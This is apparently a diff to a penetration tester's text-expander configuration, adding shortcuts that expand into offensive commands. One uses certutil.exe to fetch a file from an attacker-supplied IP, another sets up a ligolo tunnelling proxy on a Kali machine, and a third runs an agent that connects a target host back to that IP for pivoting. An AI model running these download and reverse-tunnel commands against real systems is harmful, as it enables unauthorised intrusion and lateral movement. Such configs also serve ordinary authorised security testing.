@@ -65,3 +65,18 @@ matches:
   
   - trigger: ":wget"
     replace: wget http://{{IP}}/
+    
+  - trigger: ":certutil"
+    replace: certutil.exe -urlcache -split -f http://{{IP}}/
+  
+  - trigger: ":pligolo"
+    replace: |
+      sudo ip tuntap add user kali mode tun ligolo
+      sudo ip link set ligolo up
+      ./proxy -selfcert
+  
+  - trigger: ":aligolo"
+    replace: | 
+      ./agent -connect {{IP}}:11601
+  
+  -
